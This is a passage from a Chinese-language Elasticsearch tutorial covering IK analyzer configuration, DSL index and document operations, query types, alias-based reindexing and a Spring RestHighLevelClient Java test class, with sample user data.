 <!--用户可以在这里配置自己的扩展字典 -->  \n        <entry key=\"ext\\_dict\"\\>new\\_word.dic</entry>  \n         <!--用户可以在这里配置自己的扩展停止词字典-->  \n        <entry key=\"ext\\_stopwords\"\\></entry>  \n        <!--用户可以在这里配置远程扩展字典 -->  \n        <!-- <entry key=\"remote\\_ext\\_dict\"\\>words\\_location</entry> -->  \n        <!--用户可以在这里配置远程扩展停止词字典-->  \n        <!-- <entry key=\"remote\\_ext\\_stopwords\"\\>words\\_location</entry> -->  \n</properties>  \n\n\n\n```\n\n4.  **拷贝到宿主机**\n\n\n```\n\n\ndocker cp es:/usr/share/elasticsearch/plugins/elasticsearch-analysis-ik/config ~/ik  \n\n\n\n```\n\n5.  **重启**\n\n\n```\n\n\ndocker restart es  \n\n\n\n```\n\n4 高级的DSL 查询\n===========\n\n前面介绍了基础的DSL查询，接下来，介绍一下高级的DSL 查询\n\nES提供基于DSL(Domain Specific Language)的索引查询模式，\n\nDSL查询基于JSON定义查询\n\nWikipedia对于DSL的定义\"**为了解决某一类任务而专门设计的计算机语言\"**\n\n大师Martin Fowler对于DSL定义“**DSL 通过在表达能力上做的妥协换取在某一领域内的高效**”\n\n我们在使用ES的时候，避免不了使用DSL语句去查询，就像使用关系型数据库的时候要学会SQL语法一样。\n\n如果我们学习好了DSL语法的使用，那么在日后使用和使用Java Client调用时候也会变得非常简单。\n\n![](./2024/06/16/ES从入门到精通/18.png)\n> Elasticsearch provides a full Query DSL (Domain Specific Language) based on JSON to define queries. Think of the Query DSL as an AST (Abstract Syntax Tree) of queries\n\n4.1 管理索引\n--------\n\n查看所有的索引\n\n```\n\n\nGET \\_cat/indices?v  \n\n\n\n```\n\n![](./2024/06/16/ES从入门到精通/19.png)\n1.  **删除某个索引**\n\n\n```\n\n\nDELETE /skuinfo  \n\n\n\n```\n\n2.  **新增索引**\n\n\n```\n\n\nPUT /user  \n\n\n\n```\n\n3.  **创建映射**\n\n\n```\n\n\nPUT /user/\\_mapping  \n{  \n  \"properties\": {  \n    \"name\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    },  \n    \"city\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    },  \n    \"age\":{  \n      \"type\": \"long\"  \n    },  \n    \"description\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n4.  **新增文档数据**\n\n\n```\n\n\nPUT /user/\\_doc/1  \n{  \n  \"name\":\"李四\",  \n  \"age\":22,  \n  \"city\":\"深圳\",  \n  \"description\":\"李四来自湖北武汉！\"  \n}  \n  \n\n\n\n```\n\n再增加几条记录：\n\n```\n\n\n#新增文档数据 id=2  \nPUT /user/\\_doc/2  \n{  \n  \"name\":\"王五\",  \n  \"age\":35,  \n  \"city\":\"深圳\",  \n  \"description\":\"王五家住在深圳！\"  \n}  \n  \n#新增文档数据 id=3  \nPUT /user/\\_doc/3  \n{  \n  \"name\":\"张三\",  \n  \"age\":19,  \n  \"city\":\"深圳\",  \n  \"description\":\"在深圳打工，来自湖北武汉\"  \n}  \n  \n#新增文档数据 id=4  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"age\":66,  \n  \"city\":\"武汉\",  \n  \"description\":\"在武汉读书，家在武汉！\"  \n}  \n  \n#新增文档数据 id=5  \nPUT /user/\\_doc/5  \n{  \n  \"name\":\"赵子龙\",  \n  \"age\":77,  \n  \"city\":\"广州\",  \n  \"description\":\"赵子龙来自深圳宝安，但是在广州工作！\",  \n  \"address\":\"广东省茂名市\"  \n}  \n  \n#新增文档数据 id=6  \nPUT /user/\\_doc/6  \n{  \n  \"name\":\"赵毅\",  \n  \"age\":55,  \n  \"city\":\"广州\",  \n  \"description\":\"赵毅来自广州白云区，从事电子商务8年！\"  \n}  \n  \n#新增文档数据 id=7  \nPUT /user/\\_doc/7  \n{  \n  \"name\":\"赵哈哈\",  \n  \"age\":57,  \n  \"city\":\"武汉\",  \n  \"description\":\"武汉赵哈哈，在深圳打工已有半年了，月薪7500！\"  \n}  \n\n\n\n```\n\n5.  **修改数据**\n\n\n**（1）操作1**\n\n更新数据可以使用之前的增加操作,这种操作会将整个数据替换掉，代码如下：\n\n```\n\n\n#更新数据,id=4  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"description\":\"在武汉读书，家在武汉！在深圳工作！\"  \n}  \n\n\n\n```\n\n使用GET命令查看：\n\n```\n\n\n#根据ID查询  \nGET /user/\\_doc/4  \n\n\n\n```\n\n**（2）操作2**\n\n我们先使用下面命令恢复数据：\n\n```\n\n\n#恢复文档数据 id=4  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"age\":66,  \n  \"city\":\"武汉\",  \n  \"description\":\"在武汉读书，家在武汉！\"  \n}  \n\n\n\n```\n\n使用POST更新某个列的数据\n\n```\n\n\n#使用POST更新某个域的数据  \nPOST /user/\\_doc/4  \n{  \n  \"doc\":{  \n    \"name\":\"张三丰\",  \n    \"description\":\"在武汉读书，家在武汉！在深圳工作！\"  \n  }  \n}  \n\n\n\n```\n\n6.  **删除Document**\n\n\n```\n\n\n#删除数据  \nDELETE user/userinfo/7  \n\n\n\n```\n\n4.2 数据查询\n--------\n\n1.  **查询所有数据**\n\n\n```\n\n\n#查询所有  \nGET /user/\\_search  \n\n\n\n```\n\n2.  **根据ID查询**\n\n\n```\n\n\n#根据ID查询  \nGET /user/\\_doc/2  \n\n\n\n```\n\n3.  **Sort排序**\n\n\n```\n\n\n#搜索排序  \nGET /user/\\_search  \n{  \n  \"query\":{  \n    \"match\\_all\": {}  \n  },  \n  \"sort\":{  \n    \"age\":{  \n      \"order\":\"desc\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n4.  **分页**\n\n\n```\n\n\n#分页实现  \nGET /user/\\_search  \n{  \n  \"query\":{  \n    \"match\\_all\": {}  \n  },  \n  \"sort\":{  \n    \"age\":{  \n      \"order\":\"desc\"  \n    }  \n  },  \n  \"from\": 0,  \n  \"size\": 2  \n}  \n\n\n\n```\n\n*   from:从下N的记录开始查询\n\n*   size:每页显示条数\n\n\n4.3 查询模式\n--------\n\n1.  **term查询**\n\n\nterm主要用于分词精确匹配，如字符串、数值、日期等（不适合情况：1.列中除英文字符外有其它值 2.字符串值中有冒号或中文 3.系统自带属性如\\_version）\n\n```\n\n\n#查询-term  \nGET \\_search  \n{  \n  \"query\":{  \n    \"term\":{  \n      \"city\":\"武汉\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n2.  **terms 查询**\n\n\nterms 跟 term 有点类似，但 terms 允许指定多个匹配条件。 如果某个字段指定了多个值，那么文档需要一起去做匹配 。\n\n```\n\n\n#查询-terms 允许多个Term  \nGET \\_search  \n{  \n  \"query\":{  \n    \"terms\":{  \n      \"city\":  \n        \\[  \n          \"武汉\",  \n          \"广州\"  \n        \\]  \n    }  \n  }  \n}  \n\n\n\n```\n\n3.  **match查询**\n\n\n```\n\n\nGET \\_search  \n{  \n  \"query\": {  \n    \"match\": {  \n      \"city\": \"广州武汉\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n4.  **query\\_string查询**\n\n\n```\n\n\nGET \\_search  \n{  \n  \"query\": {  \n    \"query\\_string\": {  \n      \"default\\_field\": \"city\",  \n      \"query\": \"广州武汉\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n5.  **range 查询**\n\n\nrange过滤允许我们按照指定范围查找一批数据。例如我们查询年龄范围\n\n```\n\n\n#-range 范围过滤  \n#gt表示> gte表示=>  \n#lt表示< lte表示<=  \nGET \\_search  \n{  \n  \"query\":{  \n    \"range\": {  \n      \"age\": {  \n        \"gte\": 30,  \n        \"lte\": 57  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n6.  **exists**\n\n\nexists 过滤可以用于查找拥有某个域的数据\n\n```\n\n\n#搜索 exists：是指包含某个域的数据检索  \nGET \\_search  \n{  \n  \"query\": {  \n    \"exists\":{  \n      \"field\":\"address\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n7.  **bool 查询**\n\n\nbool 可以用来合并多个条件查询结果的布尔逻辑，它包含以下操作符：\n\n*   must : 多个查询条件的完全匹配,相当于 and。\n\n*   must\\_not : 多个查询条件的相反匹配，相当于 not。\n\n*   should : 至少有一个查询条件匹配, 相当于 or。\n\n\n这些参数可以分别继承一个过滤条件或者一个过滤条件的数组：\n\n```\n\n\n#过滤搜索 bool   \n#must : 多个查询条件的完全匹配,相当于 and。  \n#must\\_not : 多个查询条件的相反匹配，相当于 not。  \n#should : 至少有一个查询条件匹配, 相当于 or。  \nGET \\_search  \n{  \n  \"query\": {  \n    \"bool\": {  \n      \"must\": \\[  \n        {  \n          \"term\": {  \n            \"city\": {  \n              \"value\": \"深圳\"  \n            }  \n          }  \n        },  \n        {  \n          \"range\":{  \n            \"age\":{  \n              \"gte\":20,  \n              \"lte\":99  \n            }  \n          }  \n        }  \n      \\]  \n    }  \n  }  \n}  \n\n\n\n```\n\n8.  **match\\_all 查询**\n\n\n可以查询到所有文档，是没有查询条件下的默认语句。\n\n```\n\n\n#查询所有 match\\_all  \nGET \\_search  \n{  \n  \"query\": {  \n    \"match\\_all\": {}  \n  }  \n}  \n\n\n\n```\n\n9.  **match 查询**\n\n\nmatch查询是一个标准查询，不管你需要全文本查询还是精确查询基本上都要用到它。如果你使用 match 查询一个全文本字段，它会在真正查询之前用分析器先分析match一下查询字符：\n\n```\n\n\n#字符串匹配  \nGET \\_search  \n{  \n  \"query\": {  \n    \"match\": {  \n      \"description\": \"武汉广州\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n10.  **prefix 查询**\n\n\n以什么字符开头的，可以更简单地用 prefix ,例如查询所有以张开始的用户描述\n\n```\n\n\n#前缀匹配 prefix  \nGET \\_search  \n{  \n  \"query\": {  \n    \"prefix\": {  \n      \"name\": {  \n        \"value\": \"赵\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n10.  **multi\\_match 查询**\n\n\nmulti\\_match查询允许你做match查询的基础上同时搜索多个字段，在多个字段中同时查一个\n\n```\n\n\n#多个域匹配搜索  \nGET \\_search  \n{  \n  \"query\": {  \n    \"multi\\_match\": {  \n      \"query\": \"深圳\",  \n      \"fields\": \\[  \n        \"city\",  \n        \"description\"  \n      \\]  \n    }  \n  }  \n}  \n\n\n\n```\n\n11.  **filter**\n\n\n因为过滤可以使用缓存，同时不计算分数，通常的规则是，使用查询（query）语句来进行 全文 搜索或者其它任何需要影响 相关性得分 的搜索。除此以外的情况都使用过滤（filters)\n\n```\n\n\nGET /user/\\_search  \n{  \n  \"query\": {  \n    \"bool\": {  \n      \"filter\": {  \n         \"range\":{  \n          \"age\":{  \n            \"gte\":25,  \n            \"lte\": 80  \n          }  \n        }  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n完整DSL案例代码如下：\n\n```\n\n\n  \nGET \\_cat/health?v  \n  \nGET \\_cat/nodes?v  \n  \nGET \\_cat/indices?v  \n  \nDELETE /user  \n  \nPUT /user  \n  \n  \nPUT /user/\\_mapping  \n{  \n  \"properties\": {  \n    \"name\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    },  \n    \"city\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    },  \n    \"age\":{  \n      \"type\": \"long\"  \n    },  \n    \"description\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    }  \n  }  \n}  \n  \nPUT /user/\\_doc/1  \n{  \n  \"name\":\"李四\",  \n  \"age\":22,  \n  \"city\":\"深圳\",  \n  \"description\":\"李四来自湖北武汉！\"  \n}  \n  \n  \n#新增文档数据 id=2  \nPUT /user/\\_doc/2  \n{  \n  \"name\":\"王五\",  \n  \"age\":35,  \n  \"city\":\"深圳\",  \n  \"description\":\"王五家住在深圳！\"  \n}  \n  \n#新增文档数据 id=3  \nPUT /user/\\_doc/3  \n{  \n  \"name\":\"张三\",  \n  \"age\":19,  \n  \"city\":\"深圳\",  \n  \"description\":\"在深圳打工，来自湖北武汉\"  \n}  \n  \n#新增文档数据 id=4  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"age\":66,  \n  \"city\":\"武汉\",  \n  \"description\":\"在武汉读书，家在武汉！\"  \n}  \n  \n#新增文档数据 id=5  \nPUT /user/\\_doc/5  \n{  \n  \"name\":\"赵子龙\",  \n  \"age\":77,  \n  \"city\":\"广州\",  \n  \"description\":\"赵子龙来自深圳宝安，但是在广州工作！\",  \n  \"address\":\"广东省茂名市\"  \n}  \n  \n#新增文档数据 id=6  \nPUT /user/\\_doc/6  \n{  \n  \"name\":\"赵毅\",  \n  \"age\":55,  \n  \"city\":\"广州\",  \n  \"description\":\"赵毅来自广州白云区，从事电子商务8年！\"  \n}  \n  \n#新增文档数据 id=7  \nPUT /user/\\_doc/7  \n{  \n  \"name\":\"赵哈哈\",  \n  \"age\":57,  \n  \"city\":\"武汉\",  \n  \"description\":\"武汉赵哈哈，在深圳打工已有半年了，月薪7500！\"  \n}  \n  \n  \nGET /user/\\_doc/4  \n  \n  \n#更新数据,id=4  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"description\":\"在武汉读书，家在武汉！在深圳工作！\"  \n}  \n  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"age\":66,  \n  \"city\":\"武汉\",  \n  \"description\":\"在武汉读书，家在武汉！\"  \n}  \n  \n#使用POST更新某个域的数据  \nPOST /user/\\_doc/4  \n{  \n  \"doc\":{  \n    \"name\":\"张三丰\",  \n    \"description\":\"在武汉读书，家在武汉！在深圳工作！\"  \n  }  \n}  \n  \nGET /user/\\_search  \n  \nGET /user/\\_doc/2  \n  \n#搜索排序  \nGET /user/\\_search  \n{  \n  \"query\":{  \n    \"match\\_all\": {}  \n  },  \n  \"sort\":{  \n    \"age\":{  \n      \"order\":\"desc\"  \n    }  \n  }  \n}  \n  \n#分页实现  \nGET /user/\\_search  \n{  \n  \"query\":{  \n    \"match\\_all\": {}  \n  },  \n  \"sort\":{  \n    \"age\":{  \n      \"order\":\"desc\"  \n    }  \n  },  \n  \"from\": 0,  \n  \"size\": 2  \n}  \n  \n#查询-term  \nGET \\_search  \n{  \n  \"query\":{  \n    \"term\":{  \n      \"city\":\"武汉\"  \n    }  \n  }  \n}  \n  \n#查询-terms 允许多个Term  \nGET \\_search  \n{  \n  \"query\":{  \n    \"terms\":{  \n      \"city\":  \n        \\[  \n          \"武汉\",  \n          \"广州\"  \n        \\]  \n    }  \n  }  \n}  \n  \nGET \\_search  \n{  \n  \"query\": {  \n    \"match\": {  \n      \"city\": \"广州武汉\"  \n    }  \n  }  \n}    \n  \nGET \\_search  \n{  \n  \"query\": {  \n    \"query\\_string\": {  \n      \"default\\_field\": \"city\",  \n      \"query\": \"广州武汉\"  \n    }  \n  }  \n}  \n  \n#-range 范围过滤  \n#gt表示> gte表示=>  \n#lt表示< lte表示<=  \nGET \\_search  \n{  \n  \"query\":{  \n    \"range\": {  \n      \"age\": {  \n        \"gte\": 30,  \n        \"lte\": 57  \n      }  \n    }  \n  }  \n}  \n  \n#搜索 exists：是指包含某个域的数据检索  \nGET \\_search  \n{  \n  \"query\": {  \n    \"exists\":{  \n      \"field\":\"address\"  \n    }  \n  }  \n}  \n  \nGET /user/\\_search  \n#过滤搜索 bool   \n#must : 多个查询条件的完全匹配,相当于 and。  \n#must\\_not : 多个查询条件的相反匹配，相当于 not。  \n#should : 至少有一个查询条件匹配, 相当于 or。  \nGET \\_search  \n{  \n  \"query\": {  \n    \"bool\": {  \n      \"must\": \\[  \n        {  \n          \"term\": {  \n            \"city\": {  \n              \"value\": \"深圳\"  \n            }  \n          }  \n        },  \n        {  \n          \"range\":{  \n            \"age\":{  \n              \"gte\":20,  \n              \"lte\":99  \n            }  \n          }  \n        }  \n      \\]  \n    }  \n  }  \n}  \n  \n#查询所有 match\\_all  \nGET \\_search  \n{  \n  \"query\": {  \n    \"match\\_all\": {}  \n  }  \n}  \n  \n#字符串匹配  \nGET \\_search  \n{  \n  \"query\": {  \n    \"match\": {  \n      \"description\": \"武汉广州\"  \n    }  \n  }  \n}  \n  \n#前缀匹配 prefix  \nGET \\_search  \n{  \n  \"query\": {  \n    \"prefix\": {  \n      \"name\": {  \n        \"value\": \"赵\"  \n      }  \n    }  \n  }  \n}  \n  \n#多个域匹配搜索  \nGET \\_search  \n{  \n  \"query\": {  \n    \"multi\\_match\": {  \n      \"query\": \"深圳\",  \n      \"fields\": \\[  \n        \"city\",  \n        \"description\"  \n      \\]  \n    }  \n  }  \n}  \n  \n  \nGET /user/\\_search  \n{  \n  \"query\": {  \n    \"bool\": {  \n      \"filter\": {  \n         \"range\":{  \n          \"age\":{  \n            \"gte\":25,  \n            \"lte\": 80  \n          }  \n        }  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n4.4 使用别名\n--------\n\n在mysql中 我们经常遇到产品修改需求 我们可能会在原有数据库表基础上 对字段 索引 类型进行修改比如 增加一个字段 添加一个字段的索引 又或者修改某个字段的类型，这一切都看起来这么自然 不过在ES这里却是行不通的 ES的mapping一旦设置了之后，可以改，但是改了没有用，因为ES默认是对所有字段进行索引 如果你修改了mapping 那么已经索引过的数据就必须全部重新索引一遍 , ES没有提供这个机制, 只能利用别名手工刷数据，\n\n1.  **添加索引别名**\n\n\n```\n\n\nPUT article1/\\_alias/article  \n{  \n\"acknowledged\" : true  \n}  \n\n\n\n```\n\n2.  **创建新article2索引（增加了一个owner字段）**\n\n\n```\n\n\nPUT article2  \n{  \n\t\"settings\": {  \n\t\t\"number\\_of\\_shards\": 3,  \n\t\t\"number\\_of\\_replicas\": 1 ,  \n\t\t\"analysis\" : {  \n\t\t\t\"analyzer\" : {  \n\t\t\t\t\"ik\" : {  \n\t\t\t\t\t\"tokenizer\" : \"ik\\_max\\_word\"  \n\t\t\t\t}  \n\t\t\t}  \n\t\t}  \n\t},  \n\t\"mappings\": {  \n\t\t\"properties\": {  \n\t\t\t\"id\": {  \n\t\t\t\t\"type\": \"keyword\"  \n\t\t\t},  \n\t\t\t\"title\": {  \n\t\t\t\t\"type\": \"text\",  \n\t\t\t\t\"analyzer\": \"ik\\_max\\_word\"  \n\t\t\t},  \n\t\t\t\"content\": {  \n\t\t\t\t\"type\": \"text\",  \n\t\t\t\t\"analyzer\": \"ik\\_max\\_word\"  \n\t\t\t},  \n\t\t\t\"viewCount\": {  \n\t\t\t\t\"type\": \"integer\"  \n\t\t\t},  \n\t\t\t\"creatDate\": {  \n\t\t\t\t\"type\": \"date\",  \n\t\t\t\t\"format\": \"yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch\\_millis\"  \n\t\t\t},  \n\t\t\t\"tags\": {  \n\t\t\t\t\"type\": \"keyword\"  \n\t\t\t},   \n\t\t\t\"owner\": {  \n\t\t\t\t\"type\": \"keyword\"  \n\t\t\t}  \n\t\t}  \n\t}  \n}  \n\n\n\n```\n\n3.  **重建索引 reindex**\n\n\n```\n\n\nPOST \\_reindex  \n{  \n\t\"source\": {  \n\t\t\"index\": \"article1\"  \n\t},  \n\t\"dest\": {  \n\t\t\"index\": \"article2\"  \n\t}  \n}  \n\n\n\n```\n\n4.  **修改别名映射**\n\n\n```\n\n\nPOST /\\_aliases  \n{  \n\t\"actions\": \\[  \n\t{  \n\t\t\"remove\": {  \n\t\t\t\"index\": \"article1\",  \n\t\t\t\"alias\": \"article\"  \n\t\t}  \n\t},  \n\t{  \n\t\t\"add\": {  \n\t\t\t\"index\": \"article2\",  \n\t\t\t\"alias\": \"article\"  \n\t\t}  \n\t}  \n\t\\]  \n}  \n\n\n\n```\n\n5.  使用别名搜索\n\n\n```\n\n\nGET /article/\\_search  \n{  \n    \"query\": {  \n    \t\"match\\_all\": {}  \n    }  \n}  \n\n\n\n```\n\n5 从0开始，ES工业级Java 应用开发\n=====================\n\n5.1 High Level Client基本用法\n-------------------------\n\nHigh Level Client客户端是构建于 Low Level Client之上的封装。\n\n类似于Hibernate和JDBC的关系。\n\n使用Spring Data ElasticSearch访问ElastiSearch,注意版本对应关系\n\n![](./2024/06/16/ES从入门到精通/20.png)\nspring boot 2.6.1对应的ES版本\n![](./2024/06/16/ES从入门到精通/21.png)\nHigh Level Client客户端测试案例\n\n```\n\n\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.NONE)  \npublic class RestHighLevelClientTest  \n{  \n  \n    //用来操作 Elasticsearch 服务器的一个客户端对象类  \n    @Autowired  \n    private RestHighLevelClient restHLClient;  \n  \n    @ParameterizedTest  \n    @ValueSource(ints = {1, 2, 3})  \n    void testWithSimpleValueSource(int argument) {  \n        System.out.println(\"Parameterized test with value: \" + argument);  \n    }  \n  \n    @Test  \n    @SneakyThrows  \n    void testWithSneakyThrows() {  \n        throw new Exception(\"This exception is sneaky thrown!\");  \n    }  \n  \n    @ParameterizedTest  \n    @CsvSource({\"1, 1, 2\", \"2, 3, 5\", \"3, 5, 8\"})  \n    void testAddition(int a, int b, int result) {  \n        int sum = a + b;  \n        Assertions.assertEquals(result, sum, \"Sum of \" + a + \" and \" + b + \" should be \" + result);  \n    }  \n  \n    //创建三个索引库  \n    @ParameterizedTest //参数测试  \n    @SneakyThrows  \n    @ValueSource(strings = {\"books\", \"items\", \"users\"})  \n    public void testCreateIndex(String indexName)  \n    {  \n  \n        //指定分词器创建索引库的json格式的数据，每一行用双引号包起来，然后里面的每个双引号前面用反斜杠\\\\转义  \n        String json = \"{\" +  \n                \"\\\\\"settings\\\\\": {\" +  \n                \"    \\\\\"analysis\\\\\": {\" +  \n                \"      \\\\\"analyzer\\\\\": {\" +  \n                \"        \\\\\"default\\\\\": {\" +  \n                \"           \\\\\"tokenizer\\\\\": \\\\\"ik\\_max\\_word\\\\\"\" +  \n                \"        }\" +  \n                \"      }\" +  \n                \"    }\" +  \n                \"  }\" +  \n                \"}\";  \n  \n        CreateIndexRequest request = new CreateIndexRequest(indexName)  \n                //参数1：指定创建索引库时要传入的参数  ； 参数2：指定传入内容的类型  \n                .source(json, XContentType.JSON);  \n        //创建索引库后返回的响应类型--CreateIndexResponse  \n        CreateIndexResponse resp = restHLClient.indices().create(request, RequestOptions.DEFAULT);  \n  \n        //获取Elasticsearch服务器的响应，就是响应索引库是否创建成功  \n        System.err.println(resp.isAcknowledged());  \n  \n    }  \n  \n  \n    //删除索引库  \n    @SneakyThrows  \n    @ParameterizedTest  \n    @ValueSource(strings = {\"items\", \"users\"})  \n    public void testDeleteIndex(String indexName)  \n    {  \n        //删除索引的请求数据  \n        DeleteIndexRequest request = new DeleteIndexRequest(indexName);  \n        //客户端调用操作索引的方法，然后再调用删除的方法  \n        AcknowledgedResponse resp = restHLClient.indices().delete(request, RequestOptions.DEFAULT);  \n        //查看删除后的响应  \n        System.err.println(resp.isAcknowledged());  \n    }  \n  \n    //查询所有的索引库  \n    @SneakyThrows  \n    @Test //这个测试不需要参数，直接用这个@Test注解即可  \n    public void testGetIndex()  \n    {  \n        //参数 \"\\*\" ： 表示匹配所有的索引库  \n        GetIndexRequest request = new GetIndexRequest(\"\\*\");  \n        //用rest客户端的方法来查询  \n        GetIndexResponse resp = restHLClient.indices().get(request, RequestOptions.DEFAULT);  \n        //返回的索引库是一个String类型的数组  \n        String\\[\\] indices = resp.getIndices();  \n        //把数组转成字符串  \n        String s = Arrays.toString(indices);  \n        System.err.println(s);  \n  \n  \n    }  \n  \n    //往索引库添加文档  \n  \n    @ParameterizedTest  \n    @SneakyThrows  \n    //测试参数有多个值 ，用这个注解  \n    @CsvSource({  \n            \"1,火影忍者,旋涡鸣人成长为第七代火影的故事,150\",  \n            \"2,家庭教师,废材纲成长为十代首领的热血事迹,200\",  \n            \"4,七龙珠Z,超级赛亚人贝吉塔来到地球后的热闹景象,400\"  \n    })  \n    public void testSaveDocument(Integer id, String title, String description, Double price)  \n    {  \n        //表明向 books 索引库添加文档  \n        IndexRequest request = new IndexRequest(\"books\")  \n                .id(id + \"\")  \n                .source(  \n                        \"title\", title,  \n                        \"description\", description,  \n                        \"price\", price  \n                );  \n  \n        IndexResponse resp = restHLClient.index(request, RequestOptions.DEFAULT);  \n        System.err.println(resp);  \n  \n    }  \n  \n  \n    //根据文档的id获取文档  \n    @SneakyThrows  \n    @ParameterizedTest  \n    @ValueSource(ints = {1, 3})  \n    public void testGetDocumentById(Integer id)  \n    {  \n        //表明从 books 索引库获取文档  \n        GetRequest request = new GetRequest(\"books\")  \n                //表明根据指定的文档的id获取文档  \n                .id(id + \"\");  \n  \n        GetResponse resp = restHLClient.get(request, RequestOptions.DEFAULT);  \n  \n        System.err.println(resp);  \n  \n    }  \n  \n    //根据条件查询文档（普通关键字查询和通配符查询）  \n  \n    @SneakyThrows  \n    @ParameterizedTest  \n    @CsvSource({  \n            \"description,热\\*\",  \n            \"description,成长\"  \n    })  \n    public void testSearchDocument(String field, String term)  \n    {  \n        // 构建查询条件的类  \n        SearchSourceBuilder builder = new SearchSourceBuilder();  \n  \n        // 通过 SearchSourceBuilder 可以用面向对象的方式来构建查询的 JSON 字符串  \n        // SearchSourceBuilder 需要传入 QueryBuilders，而 QueryBuilders 用于构建 QueryBuilder  \n        if (term != null && term.contains(\"\\*\"))  \n        {  \n            //根据字段和通配符关键字查询  \n            builder.query(QueryBuilders.wildcardQuery(field, term));  \n        } else  \n        {  \n            //根据字段和普通关键字查询  \n            builder.query(QueryBuilders.matchQuery(field,term));  \n        }  \n  \n        //表明从 books 索引库查询文档  \n        SearchRequest request = new SearchRequest(\"books\")  \n                // 此处的 builder 参数用于构建查询语法  \n                .source(builder);  \n  \n        //客户端调用查询的方法 ， 参数1：查询条件语法  参数2：默认的请求选项，比如超时时间之类的  \n        SearchResponse resp = restHLClient.search(request, RequestOptions.DEFAULT);  \n  \n        System.err.println(resp);  \n  \n    }  \n  \n  \n    //根据 id 删除文档  \n  \n    @ParameterizedTest  \n    @SneakyThrows  \n    @ValueSource(ints = {3,4})  \n    public void testDeleteDocumentById(Integer id)  \n    {  \n        //表明从 books 索引库删除文档  \n        DeleteRequest request = new DeleteRequest(\"books\")  \n                //获取指定id的文档  \n                .id(id+\"\");  \n        //rest客户端调用删除文档的方法  \n        DeleteResponse resp = restHLClient.delete(request, RequestOptions.DEFAULT);  \n        System.err.println(resp);  \n    }  \n  \n  \n  \n}  \n  \n\n\n\n```\n\n5.2 聚合查询\n--------\n\n### 5.2.1 DSL聚合查询\n\n1.  创建测试索引\n\n\n```\n\n\nPUT /jh\\_test  \n{  \n\t\"settings\": {},  \n\t\"mappings\": {  \n\t\t\"properties\": {  \n\t\t\t\"name\": {  \n\t\t\t\t\"type\": \"text\",  \n                \"fields\": {  \n                    \"keyword\": {  \n                        \"type\": \"keyword\",  \n                        \"ignore\\_above\": 256  \n                    }  \n                }  \n\t\t\t},  \n\t\t\t\"sex\": {  \n\t\t\t\t\"type\": \"keyword\"  \n\t\t\t},  \n\t\t\t\"buyCount\": {  \n\t\t\t\t\"type\": \"long\"  \n\t\t\t},  \n            \"createMonth\":{  \n                \"type\":\"keyword\"  \n            }  \n\t\t}  \n\t}  \n}  \n  \n\n\n\n```\n\n其中字段的含义为：name：姓名、buyCount：购买数量，sex：性别，createMonth：创建月 添加测试数据\n\n```\n\n\nPOST /jh\\_test/\\_doc/1  \n{\"name\":\"张三\",\"buyCount\":5,\"sex\":\"男\",\"createMonth\":\"2021-01\"}  \nPOST /jh\\_test/\\_doc/2  \n{\"name\":\"李四\",\"buyCount\":5,\"sex\":\"男\",\"createMonth\":\"2021-01\"}  \nPOST /jh\\_test/\\_doc/3  \n{\"name\":\"小卷\",\"buyCount\":18,\"sex\":\"女\",\"createMonth\":\"2021-01\"}  \nPOST /jh\\_test/\\_doc/4  \n{\"name\":\"小明\",\"buyCount\":6,\"sex\":\"女\",\"createMonth\":\"2021-01\"}  \nPOST /jh\\_test/\\_doc/5  \n{\"name\":\"张三\",\"buyCount\":3,\"sex\":\"男\",\"createMonth\":\"2021-02\"}  \nPOST /jh\\_test/\\_doc/6  \n{\"name\":\"王五\",\"buyCount\":8,\"sex\":\"男\",\"createMonth\":\"2021-02\"}  \nPOST /jh\\_test/\\_doc/7  \n{\"name\":\"赵四\",\"buyCount\":4,\"sex\":\"男\",\"createMonth\":\"2021-02\"}  \nPOST /jh\\_test/\\_doc/8  \n{\"name\":\"诸葛亮\",\"buyCount\":6,\"sex\":\"男\",\"createMonth\":\"2021-02\"}  \nPOST /jh\\_test/\\_doc/9  \n{\"name\":\"黄忠\",\"buyCount\":9,\"sex\":\"男\",\"createMonth\":\"2021-03\"}  \nPOST /jh\\_test/\\_doc/10  \n{\"name\":\"李白\",\"buyCount\":1,\"sex\":\"男\",\"createMonth\":\"2021-03\"}  \nPOST /jh\\_test/\\_doc/11  \n{\"name\":\"赵四\",\"buyCount\":3,\"sex\":\"男\",\"createMonth\":\"2021-03\"}  \nPOST /jh\\_test/\\_doc/12  \n{\"name\":\"张三\",\"buyCount\":2,\"sex\":\"男\",\"createMonth\":\"2021-03\"}  \nPOST /jh\\_test/\\_doc/13  \n{\"name\":\"李四\",\"buyCount\":6,\"sex\":\"男\",\"createMonth\":\"2021-04\"}  \nPOST 